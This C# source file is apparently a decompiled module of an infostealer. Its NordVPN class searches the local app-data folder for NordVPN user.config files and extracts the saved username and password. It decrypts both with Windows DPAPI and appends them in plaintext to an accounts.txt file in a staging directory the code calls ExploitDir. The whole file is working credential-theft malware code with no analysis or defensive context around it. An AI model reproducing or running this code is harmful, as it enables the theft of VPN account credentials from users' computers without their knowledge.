﻿using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace SHARP
{
	// Token: 0x0200006B RID: 107
	internal class NordVPN
	{
		// Token: 0x06000249 RID: 585 RVA: 0x0000E8B8 File Offset: 0x0000CAB8
		private static string Decode(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x0600024A RID: 586 RVA: 0x0000E8FC File Offset: 0x0000CAFC
		public static void Save()
		{
			string exploitDir = Help.ExploitDir;
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Paths.lappdata, "NordVPN"));
			if (!directoryInfo.Exists)
			{
				return;
			}
			try
			{
				DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
				for (int i = 0; i < directories.Length; i++)
				{
					DirectoryInfo[] directories2 = directories[i].GetDirectories();
					for (int j = 0; j < directories2.Length; j++)
					{
						string text = Path.Combine(directories2[j].FullName, "user.config");
						if (File.Exists(text))
						{
							Directory.CreateDirectory(exploitDir + "\\VPN\\NordVPN\\");
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text);
							string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
							string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
							if (innerText != null && !string.IsNullOrEmpty(innerText) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
							{
								string text2 = NordVPN.Decode(innerText);
								string text3 = NordVPN.Decode(innerText2);
								Counting.NordVPN++;
								File.AppendAllText(exploitDir + "\\VPN\\NordVPN\\\\accounts.txt", string.Concat(new string[]
								{
									"Username: ",
									text2,
									"\nPassword: ",
									text3,
									"\n\n"
								}));
							}
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
